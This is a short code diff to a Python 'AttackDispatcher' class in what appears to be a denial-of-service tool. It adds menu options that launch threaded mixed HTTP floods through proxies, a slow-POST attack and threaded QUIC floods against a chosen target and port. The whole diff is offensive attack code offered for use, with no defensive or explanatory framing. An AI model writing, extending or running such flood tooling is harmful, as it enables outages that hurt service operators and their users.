@@ -171,3 +171,18 @@ class AttackDispatcher:
         elif choice == "32":
             url = target if target.startswith("http") else f"http://{target}"
             web_exposure_sniper(url)
+
+        elif choice == "33":
+            url = target if target.startswith("http") else f"http://{target}"
+            for _ in range(threads):
+                increment_thread_counter()
+                threading.Thread(target=mixed_flood, args=(url, duration, proxies, monitor), daemon=True).start()
+
+        elif choice == "34":
+            url = target if target.startswith("http") else f"http://{target}"
+            slowpost_attack(url, duration, monitor)
+
+        elif choice == "35":
+            for _ in range(threads):
+                increment_thread_counter()
+                threading.Thread(target=quic_flood, args=(target, port, duration, monitor), daemon=True).start()
